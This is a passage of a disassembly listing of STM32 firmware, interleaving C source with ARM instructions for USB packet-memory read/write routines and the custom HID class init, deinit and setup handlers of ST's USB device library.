 800846a:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800846e:	4313      	orrs	r3, r2
 8008470:	b21b      	sxth	r3, r3
 8008472:	827b      	strh	r3, [r7, #18]
    *pdwVal = (WrVal & 0xFFFFU);
 8008474:	6a3b      	ldr	r3, [r7, #32]
 8008476:	8a7a      	ldrh	r2, [r7, #18]
 8008478:	801a      	strh	r2, [r3, #0]
    pdwVal++;
 800847a:	6a3b      	ldr	r3, [r7, #32]
 800847c:	3302      	adds	r3, #2
 800847e:	623b      	str	r3, [r7, #32]

#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */

    pBuf++;
 8008480:	69fb      	ldr	r3, [r7, #28]
 8008482:	3301      	adds	r3, #1
 8008484:	61fb      	str	r3, [r7, #28]
    pBuf++;
 8008486:	69fb      	ldr	r3, [r7, #28]
 8008488:	3301      	adds	r3, #1
 800848a:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 800848c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800848e:	3b01      	subs	r3, #1
 8008490:	627b      	str	r3, [r7, #36]	; 0x24
 8008492:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008494:	2b00      	cmp	r3, #0
 8008496:	d1e0      	bne.n	800845a <USB_WritePMA+0x38>
  }
}
 8008498:	bf00      	nop
 800849a:	bf00      	nop
 800849c:	372c      	adds	r7, #44	; 0x2c
 800849e:	46bd      	mov	sp, r7
 80084a0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80084a4:	4770      	bx	lr

080084a6 <USB_ReadPMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_ReadPMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 80084a6:	b480      	push	{r7}
 80084a8:	b08b      	sub	sp, #44	; 0x2c
 80084aa:	af00      	add	r7, sp, #0
 80084ac:	60f8      	str	r0, [r7, #12]
 80084ae:	60b9      	str	r1, [r7, #8]
 80084b0:	4611      	mov	r1, r2
 80084b2:	461a      	mov	r2, r3
 80084b4:	460b      	mov	r3, r1
 80084b6:	80fb      	strh	r3, [r7, #6]
 80084b8:	4613      	mov	r3, r2
 80084ba:	80bb      	strh	r3, [r7, #4]
  uint32_t n = (uint32_t)wNBytes >> 1;
 80084bc:	88bb      	ldrh	r3, [r7, #4]
 80084be:	085b      	lsrs	r3, r3, #1
 80084c0:	b29b      	uxth	r3, r3
 80084c2:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 80084c4:	68fb      	ldr	r3, [r7, #12]
 80084c6:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint32_t RdVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 80084c8:	68bb      	ldr	r3, [r7, #8]
 80084ca:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 80084cc:	88fa      	ldrh	r2, [r7, #6]
 80084ce:	697b      	ldr	r3, [r7, #20]
 80084d0:	4413      	add	r3, r2
 80084d2:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80084d6:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 80084d8:	69bb      	ldr	r3, [r7, #24]
 80084da:	627b      	str	r3, [r7, #36]	; 0x24
 80084dc:	e018      	b.n	8008510 <USB_ReadPMA+0x6a>
  {
    RdVal = *(__IO uint16_t *)pdwVal;
 80084de:	6a3b      	ldr	r3, [r7, #32]
 80084e0:	881b      	ldrh	r3, [r3, #0]
 80084e2:	b29b      	uxth	r3, r3
 80084e4:	613b      	str	r3, [r7, #16]
    pdwVal++;
 80084e6:	6a3b      	ldr	r3, [r7, #32]
 80084e8:	3302      	adds	r3, #2
 80084ea:	623b      	str	r3, [r7, #32]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 80084ec:	693b      	ldr	r3, [r7, #16]
 80084ee:	b2da      	uxtb	r2, r3
 80084f0:	69fb      	ldr	r3, [r7, #28]
 80084f2:	701a      	strb	r2, [r3, #0]
    pBuf++;
 80084f4:	69fb      	ldr	r3, [r7, #28]
 80084f6:	3301      	adds	r3, #1
 80084f8:	61fb      	str	r3, [r7, #28]
    *pBuf = (uint8_t)((RdVal >> 8) & 0xFFU);
 80084fa:	693b      	ldr	r3, [r7, #16]
 80084fc:	0a1b      	lsrs	r3, r3, #8
 80084fe:	b2da      	uxtb	r2, r3
 8008500:	69fb      	ldr	r3, [r7, #28]
 8008502:	701a      	strb	r2, [r3, #0]
    pBuf++;
 8008504:	69fb      	ldr	r3, [r7, #28]
 8008506:	3301      	adds	r3, #1
 8008508:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 800850a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800850c:	3b01      	subs	r3, #1
 800850e:	627b      	str	r3, [r7, #36]	; 0x24
 8008510:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008512:	2b00      	cmp	r3, #0
 8008514:	d1e3      	bne.n	80084de <USB_ReadPMA+0x38>
#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */
  }

  if ((wNBytes % 2U) != 0U)
 8008516:	88bb      	ldrh	r3, [r7, #4]
 8008518:	f003 0301 	and.w	r3, r3, #1
 800851c:	b29b      	uxth	r3, r3
 800851e:	2b00      	cmp	r3, #0
 8008520:	d007      	beq.n	8008532 <USB_ReadPMA+0x8c>
  {
    RdVal = *pdwVal;
 8008522:	6a3b      	ldr	r3, [r7, #32]
 8008524:	881b      	ldrh	r3, [r3, #0]
 8008526:	b29b      	uxth	r3, r3
 8008528:	613b      	str	r3, [r7, #16]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 800852a:	693b      	ldr	r3, [r7, #16]
 800852c:	b2da      	uxtb	r2, r3
 800852e:	69fb      	ldr	r3, [r7, #28]
 8008530:	701a      	strb	r2, [r3, #0]
  }
}
 8008532:	bf00      	nop
 8008534:	372c      	adds	r7, #44	; 0x2c
 8008536:	46bd      	mov	sp, r7
 8008538:	f85d 7b04 	ldr.w	r7, [sp], #4
 800853c:	4770      	bx	lr
	...

08008540 <USBD_CUSTOM_HID_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008540:	b580      	push	{r7, lr}
 8008542:	b084      	sub	sp, #16
 8008544:	af00      	add	r7, sp, #0
 8008546:	6078      	str	r0, [r7, #4]
 8008548:	460b      	mov	r3, r1
 800854a:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)USBD_malloc(sizeof(USBD_CUSTOM_HID_HandleTypeDef));
 800854c:	2024      	movs	r0, #36	; 0x24
 800854e:	f004 fd05 	bl	800cf5c <USBD_static_malloc>
 8008552:	60f8      	str	r0, [r7, #12]

  if (hhid == NULL)
 8008554:	68fb      	ldr	r3, [r7, #12]
 8008556:	2b00      	cmp	r3, #0
 8008558:	d109      	bne.n	800856e <USBD_CUSTOM_HID_Init+0x2e>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 800855a:	687b      	ldr	r3, [r7, #4]
 800855c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008560:	687b      	ldr	r3, [r7, #4]
 8008562:	32b0      	adds	r2, #176	; 0xb0
 8008564:	2100      	movs	r1, #0
 8008566:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 800856a:	2302      	movs	r3, #2
 800856c:	e08b      	b.n	8008686 <USBD_CUSTOM_HID_Init+0x146>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hhid;
 800856e:	687b      	ldr	r3, [r7, #4]
 8008570:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008574:	687b      	ldr	r3, [r7, #4]
 8008576:	32b0      	adds	r2, #176	; 0xb0
 8008578:	68f9      	ldr	r1, [r7, #12]
 800857a:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 800857e:	687b      	ldr	r3, [r7, #4]
 8008580:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008584:	687b      	ldr	r3, [r7, #4]
 8008586:	32b0      	adds	r2, #176	; 0xb0
 8008588:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 800858c:	687b      	ldr	r3, [r7, #4]
 800858e:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008592:	687b      	ldr	r3, [r7, #4]
 8008594:	7c1b      	ldrb	r3, [r3, #16]
 8008596:	2b00      	cmp	r3, #0
 8008598:	d11b      	bne.n	80085d2 <USBD_CUSTOM_HID_Init+0x92>
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 800859a:	4b3d      	ldr	r3, [pc, #244]	; (8008690 <USBD_CUSTOM_HID_Init+0x150>)
 800859c:	781b      	ldrb	r3, [r3, #0]
 800859e:	f003 020f 	and.w	r2, r3, #15
 80085a2:	6879      	ldr	r1, [r7, #4]
 80085a4:	4613      	mov	r3, r2
 80085a6:	009b      	lsls	r3, r3, #2
 80085a8:	4413      	add	r3, r2
 80085aa:	009b      	lsls	r3, r3, #2
 80085ac:	440b      	add	r3, r1
 80085ae:	3326      	adds	r3, #38	; 0x26
 80085b0:	2205      	movs	r2, #5
 80085b2:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 80085b4:	4b37      	ldr	r3, [pc, #220]	; (8008694 <USBD_CUSTOM_HID_Init+0x154>)
 80085b6:	781b      	ldrb	r3, [r3, #0]
 80085b8:	f003 020f 	and.w	r2, r3, #15
 80085bc:	6879      	ldr	r1, [r7, #4]
 80085be:	4613      	mov	r3, r2
 80085c0:	009b      	lsls	r3, r3, #2
 80085c2:	4413      	add	r3, r2
 80085c4:	009b      	lsls	r3, r3, #2
 80085c6:	440b      	add	r3, r1
 80085c8:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 80085cc:	2205      	movs	r2, #5
 80085ce:	801a      	strh	r2, [r3, #0]
 80085d0:	e01a      	b.n	8008608 <USBD_CUSTOM_HID_Init+0xc8>
  }
  else   /* LOW and FULL-speed endpoints */
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 80085d2:	4b2f      	ldr	r3, [pc, #188]	; (8008690 <USBD_CUSTOM_HID_Init+0x150>)
 80085d4:	781b      	ldrb	r3, [r3, #0]
 80085d6:	f003 020f 	and.w	r2, r3, #15
 80085da:	6879      	ldr	r1, [r7, #4]
 80085dc:	4613      	mov	r3, r2
 80085de:	009b      	lsls	r3, r3, #2
 80085e0:	4413      	add	r3, r2
 80085e2:	009b      	lsls	r3, r3, #2
 80085e4:	440b      	add	r3, r1
 80085e6:	3326      	adds	r3, #38	; 0x26
 80085e8:	2205      	movs	r2, #5
 80085ea:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 80085ec:	4b29      	ldr	r3, [pc, #164]	; (8008694 <USBD_CUSTOM_HID_Init+0x154>)
 80085ee:	781b      	ldrb	r3, [r3, #0]
 80085f0:	f003 020f 	and.w	r2, r3, #15
 80085f4:	6879      	ldr	r1, [r7, #4]
 80085f6:	4613      	mov	r3, r2
 80085f8:	009b      	lsls	r3, r3, #2
 80085fa:	4413      	add	r3, r2
 80085fc:	009b      	lsls	r3, r3, #2
 80085fe:	440b      	add	r3, r1
 8008600:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008604:	2205      	movs	r2, #5
 8008606:	801a      	strh	r2, [r3, #0]
  }

  /* Open EP IN */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDInEpAdd, USBD_EP_TYPE_INTR,
 8008608:	4b21      	ldr	r3, [pc, #132]	; (8008690 <USBD_CUSTOM_HID_Init+0x150>)
 800860a:	7819      	ldrb	r1, [r3, #0]
 800860c:	2302      	movs	r3, #2
 800860e:	2203      	movs	r2, #3
 8008610:	6878      	ldr	r0, [r7, #4]
 8008612:	f004 fa6f 	bl	800caf4 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPIN_SIZE);

  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 1U;
 8008616:	4b1e      	ldr	r3, [pc, #120]	; (8008690 <USBD_CUSTOM_HID_Init+0x150>)
 8008618:	781b      	ldrb	r3, [r3, #0]
 800861a:	f003 020f 	and.w	r2, r3, #15
 800861e:	6879      	ldr	r1, [r7, #4]
 8008620:	4613      	mov	r3, r2
 8008622:	009b      	lsls	r3, r3, #2
 8008624:	4413      	add	r3, r2
 8008626:	009b      	lsls	r3, r3, #2
 8008628:	440b      	add	r3, r1
 800862a:	3324      	adds	r3, #36	; 0x24
 800862c:	2201      	movs	r2, #1
 800862e:	801a      	strh	r2, [r3, #0]

  /* Open EP OUT */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDOutEpAdd, USBD_EP_TYPE_INTR,
 8008630:	4b18      	ldr	r3, [pc, #96]	; (8008694 <USBD_CUSTOM_HID_Init+0x154>)
 8008632:	7819      	ldrb	r1, [r3, #0]
 8008634:	2302      	movs	r3, #2
 8008636:	2203      	movs	r2, #3
 8008638:	6878      	ldr	r0, [r7, #4]
 800863a:	f004 fa5b 	bl	800caf4 <USBD_LL_OpenEP>
                       CUSTOM_HID_EPOUT_SIZE);

  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 1U;
 800863e:	4b15      	ldr	r3, [pc, #84]	; (8008694 <USBD_CUSTOM_HID_Init+0x154>)
 8008640:	781b      	ldrb	r3, [r3, #0]
 8008642:	f003 020f 	and.w	r2, r3, #15
 8008646:	6879      	ldr	r1, [r7, #4]
 8008648:	4613      	mov	r3, r2
 800864a:	009b      	lsls	r3, r3, #2
 800864c:	4413      	add	r3, r2
 800864e:	009b      	lsls	r3, r3, #2
 8008650:	440b      	add	r3, r1
 8008652:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008656:	2201      	movs	r2, #1
 8008658:	801a      	strh	r2, [r3, #0]

  hhid->state = CUSTOM_HID_IDLE;
 800865a:	68fb      	ldr	r3, [r7, #12]
 800865c:	2200      	movs	r2, #0
 800865e:	f883 2020 	strb.w	r2, [r3, #32]

  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->Init();
 8008662:	687b      	ldr	r3, [r7, #4]
 8008664:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008668:	687a      	ldr	r2, [r7, #4]
 800866a:	33b0      	adds	r3, #176	; 0xb0
 800866c:	009b      	lsls	r3, r3, #2
 800866e:	4413      	add	r3, r2
 8008670:	685b      	ldr	r3, [r3, #4]
 8008672:	685b      	ldr	r3, [r3, #4]
 8008674:	4798      	blx	r3

#ifndef USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED
  /* Prepare Out endpoint to receive 1st packet */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008676:	4b07      	ldr	r3, [pc, #28]	; (8008694 <USBD_CUSTOM_HID_Init+0x154>)
 8008678:	7819      	ldrb	r1, [r3, #0]
 800867a:	68fa      	ldr	r2, [r7, #12]
 800867c:	230f      	movs	r3, #15
 800867e:	6878      	ldr	r0, [r7, #4]
 8008680:	f004 fbea 	bl	800ce58 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
#endif /* USBD_CUSTOMHID_OUT_PREPARE_RECEIVE_DISABLED */

  return (uint8_t)USBD_OK;
 8008684:	2300      	movs	r3, #0
}
 8008686:	4618      	mov	r0, r3
 8008688:	3710      	adds	r7, #16
 800868a:	46bd      	mov	sp, r7
 800868c:	bd80      	pop	{r7, pc}
 800868e:	bf00      	nop
 8008690:	200000a6 	.word	0x200000a6
 8008694:	200000a7 	.word	0x200000a7

08008698 <USBD_CUSTOM_HID_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008698:	b580      	push	{r7, lr}
 800869a:	b082      	sub	sp, #8
 800869c:	af00      	add	r7, sp, #0
 800869e:	6078      	str	r0, [r7, #4]
 80086a0:	460b      	mov	r3, r1
 80086a2:	70fb      	strb	r3, [r7, #3]
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close CUSTOM_HID EP IN */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDInEpAdd);
 80086a4:	4b37      	ldr	r3, [pc, #220]	; (8008784 <USBD_CUSTOM_HID_DeInit+0xec>)
 80086a6:	781b      	ldrb	r3, [r3, #0]
 80086a8:	4619      	mov	r1, r3
 80086aa:	6878      	ldr	r0, [r7, #4]
 80086ac:	f004 fa60 	bl	800cb70 <USBD_LL_CloseEP>
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 0U;
 80086b0:	4b34      	ldr	r3, [pc, #208]	; (8008784 <USBD_CUSTOM_HID_DeInit+0xec>)
 80086b2:	781b      	ldrb	r3, [r3, #0]
 80086b4:	f003 020f 	and.w	r2, r3, #15
 80086b8:	6879      	ldr	r1, [r7, #4]
 80086ba:	4613      	mov	r3, r2
 80086bc:	009b      	lsls	r3, r3, #2
 80086be:	4413      	add	r3, r2
 80086c0:	009b      	lsls	r3, r3, #2
 80086c2:	440b      	add	r3, r1
 80086c4:	3324      	adds	r3, #36	; 0x24
 80086c6:	2200      	movs	r2, #0
 80086c8:	801a      	strh	r2, [r3, #0]
  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = 0U;
 80086ca:	4b2e      	ldr	r3, [pc, #184]	; (8008784 <USBD_CUSTOM_HID_DeInit+0xec>)
 80086cc:	781b      	ldrb	r3, [r3, #0]
 80086ce:	f003 020f 	and.w	r2, r3, #15
 80086d2:	6879      	ldr	r1, [r7, #4]
 80086d4:	4613      	mov	r3, r2
 80086d6:	009b      	lsls	r3, r3, #2
 80086d8:	4413      	add	r3, r2
 80086da:	009b      	lsls	r3, r3, #2
 80086dc:	440b      	add	r3, r1
 80086de:	3326      	adds	r3, #38	; 0x26
 80086e0:	2200      	movs	r2, #0
 80086e2:	801a      	strh	r2, [r3, #0]

  /* Close CUSTOM_HID EP OUT */
  (void)USBD_LL_CloseEP(pdev, CUSTOMHIDOutEpAdd);
 80086e4:	4b28      	ldr	r3, [pc, #160]	; (8008788 <USBD_CUSTOM_HID_DeInit+0xf0>)
 80086e6:	781b      	ldrb	r3, [r3, #0]
 80086e8:	4619      	mov	r1, r3
 80086ea:	6878      	ldr	r0, [r7, #4]
 80086ec:	f004 fa40 	bl	800cb70 <USBD_LL_CloseEP>
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 0U;
 80086f0:	4b25      	ldr	r3, [pc, #148]	; (8008788 <USBD_CUSTOM_HID_DeInit+0xf0>)
 80086f2:	781b      	ldrb	r3, [r3, #0]
 80086f4:	f003 020f 	and.w	r2, r3, #15
 80086f8:	6879      	ldr	r1, [r7, #4]
 80086fa:	4613      	mov	r3, r2
 80086fc:	009b      	lsls	r3, r3, #2
 80086fe:	4413      	add	r3, r2
 8008700:	009b      	lsls	r3, r3, #2
 8008702:	440b      	add	r3, r1
 8008704:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008708:	2200      	movs	r2, #0
 800870a:	801a      	strh	r2, [r3, #0]
  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = 0U;
 800870c:	4b1e      	ldr	r3, [pc, #120]	; (8008788 <USBD_CUSTOM_HID_DeInit+0xf0>)
 800870e:	781b      	ldrb	r3, [r3, #0]
 8008710:	f003 020f 	and.w	r2, r3, #15
 8008714:	6879      	ldr	r1, [r7, #4]
 8008716:	4613      	mov	r3, r2
 8008718:	009b      	lsls	r3, r3, #2
 800871a:	4413      	add	r3, r2
 800871c:	009b      	lsls	r3, r3, #2
 800871e:	440b      	add	r3, r1
 8008720:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008724:	2200      	movs	r2, #0
 8008726:	801a      	strh	r2, [r3, #0]

  /* Free allocated memory */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8008728:	687b      	ldr	r3, [r7, #4]
 800872a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800872e:	687b      	ldr	r3, [r7, #4]
 8008730:	32b0      	adds	r2, #176	; 0xb0
 8008732:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008736:	2b00      	cmp	r3, #0
 8008738:	d01f      	beq.n	800877a <USBD_CUSTOM_HID_DeInit+0xe2>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->DeInit();
 800873a:	687b      	ldr	r3, [r7, #4]
 800873c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008740:	687a      	ldr	r2, [r7, #4]
 8008742:	33b0      	adds	r3, #176	; 0xb0
 8008744:	009b      	lsls	r3, r3, #2
 8008746:	4413      	add	r3, r2
 8008748:	685b      	ldr	r3, [r3, #4]
 800874a:	689b      	ldr	r3, [r3, #8]
 800874c:	4798      	blx	r3
    USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 800874e:	687b      	ldr	r3, [r7, #4]
 8008750:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008754:	687b      	ldr	r3, [r7, #4]
 8008756:	32b0      	adds	r2, #176	; 0xb0
 8008758:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800875c:	4618      	mov	r0, r3
 800875e:	f004 fc19 	bl	800cf94 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008762:	687b      	ldr	r3, [r7, #4]
 8008764:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008768:	687b      	ldr	r3, [r7, #4]
 800876a:	32b0      	adds	r2, #176	; 0xb0
 800876c:	2100      	movs	r1, #0
 800876e:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 8008772:	687b      	ldr	r3, [r7, #4]
 8008774:	2200      	movs	r2, #0
 8008776:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 800877a:	2300      	movs	r3, #0
}
 800877c:	4618      	mov	r0, r3
 800877e:	3708      	adds	r7, #8
 8008780:	46bd      	mov	sp, r7
 8008782:	bd80      	pop	{r7, pc}
 8008784:	200000a6 	.word	0x200000a6
 8008788:	200000a7 	.word	0x200000a7

0800878c <USBD_CUSTOM_HID_Setup>:
  * @param  req: usb requests
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Setup(USBD_HandleTypeDef *pdev,
                                     USBD_SetupReqTypedef *req)
{
 800878c:	b580      	push	{r7, lr}
 800878e:	b088      	sub	sp, #32
 8008790:	af00      	add	r7, sp, #0
 8008792:	6078      	str	r0, [r7, #4]
 8008794:	6039      	str	r1, [r7, #0]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008796:	687b      	ldr	r3, [r7, #4]
 8008798:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800879c:	687b      	ldr	r3, [r7, #4]
 800879e:	32b0      	adds	r2, #176	; 0xb0
 80087a0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80087a4:	613b      	str	r3, [r7, #16]
  uint16_t len = 0U;
 80087a6:	2300      	movs	r3, #0
 80087a8:	83fb      	strh	r3, [r7, #30]
#ifdef USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED
  uint16_t ReportLength = 0U;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */
  uint8_t  *pbuf = NULL;
 80087aa:	2300      	movs	r3, #0
 80087ac:	61bb      	str	r3, [r7, #24]
  uint16_t status_info = 0U;
 80087ae:	2300      	movs	r3, #0
 80087b0:	81fb      	strh	r3, [r7, #14]
  USBD_StatusTypeDef ret = USBD_OK;
 80087b2:	2300      	movs	r3, #0
 80087b4:	75fb      	strb	r3, [r7, #23]

  if (hhid == NULL)
 80087b6:	693b      	ldr	r3, [r7, #16]
 80087b8:	2b00      	cmp	r3, #0
 80087ba:	d101      	bne.n	80087c0 <USBD_CUSTOM_HID_Setup+0x34>
  {
    return (uint8_t)USBD_FAIL;
 80087bc:	2303      	movs	r3, #3
 80087be:	e0f8      	b.n	80089b2 <USBD_CUSTOM_HID_Setup+0x226>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 80087c0:	683b      	ldr	r3, [r7, #0]
 80087c2:	781b      	ldrb	r3, [r3, #0]
 80087c4:	f003 0360 	and.w	r3, r3, #96	; 0x60
 80087c8:	2b00      	cmp	r3, #0
 80087ca:	d056      	beq.n	800887a <USBD_CUSTOM_HID_Setup+0xee>
 80087cc:	2b20      	cmp	r3, #32
 80087ce:	f040 80e8 	bne.w	80089a2 <USBD_CUSTOM_HID_Setup+0x216>
  {
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 80087d2:	683b      	ldr	r3, [r7, #0]
 80087d4:	785b      	ldrb	r3, [r3, #1]
 80087d6:	3b02      	subs	r3, #2
 80087d8:	2b09      	cmp	r3, #9
 80087da:	d846      	bhi.n	800886a <USBD_CUSTOM_HID_Setup+0xde>
 80087dc:	a201      	add	r2, pc, #4	; (adr r2, 80087e4 <USBD_CUSTOM_HID_Setup+0x58>)
 80087de:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80087e2:	bf00      	nop
 80087e4:	0800883d 	.word	0x0800883d
 80087e8:	0800881b 	.word	0x0800881b
 80087ec:	0800886b 	.word	0x0800886b
 80087f0:	0800886b 	.word	0x0800886b
 80087f4:	0800886b 	.word	0x0800886b
 80087f8:	0800886b 	.word	0x0800886b
 80087fc:	0800886b 	.word	0x0800886b
 8008800:	0800884d 	.word	0x0800884d
 8008804:	0800882b 	.word	0x0800882b
 8008808:	0800880d 	.word	0x0800880d
      {
        case CUSTOM_HID_REQ_SET_PROTOCOL:
          hhid->Protocol = (uint8_t)(req->wValue);
 800880c:	683b      	ldr	r3, [r7, #0]
 800880e:	885b      	ldrh	r3, [r3, #2]
 8008810:	b2db      	uxtb	r3, r3
 8008812:	461a      	mov	r2, r3
 8008814:	693b      	ldr	r3, [r7, #16]
 8008816:	611a      	str	r2, [r3, #16]
          break;
 8008818:	e02e      	b.n	8008878 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_PROTOCOL:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->Protocol, 1U);
 800881a:	693b      	ldr	r3, [r7, #16]
 800881c:	3310      	adds	r3, #16
 800881e:	2201      	movs	r2, #1
 8008820:	4619      	mov	r1, r3
 8008822:	6878      	ldr	r0, [r7, #4]
 8008824:	f003 fd0e 	bl	800c244 <USBD_CtlSendData>
          break;
 8008828:	e026      	b.n	8008878 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_SET_IDLE:
          hhid->IdleState = (uint8_t)(req->wValue >> 8);
 800882a:	683b      	ldr	r3, [r7, #0]
 800882c:	885b      	ldrh	r3, [r3, #2]
 800882e:	0a1b      	lsrs	r3, r3, #8
 8008830:	b29b      	uxth	r3, r3
 8008832:	b2db      	uxtb	r3, r3
 8008834:	461a      	mov	r2, r3
 8008836:	693b      	ldr	r3, [r7, #16]
 8008838:	615a      	str	r2, [r3, #20]
          break;
 800883a:	e01d      	b.n	8008878 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_IDLE:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->IdleState, 1U);
 800883c:	693b      	ldr	r3, [r7, #16]
 800883e:	3314      	adds	r3, #20
 8008840:	2201      	movs	r2, #1
 8008842:	4619      	mov	r1, r3
 8008844:	6878      	ldr	r0, [r7, #4]
 8008846:	f003 fcfd 	bl	800c244 <USBD_CtlSendData>
          break;
 800884a:	e015      	b.n	8008878 <USBD_CUSTOM_HID_Setup+0xec>
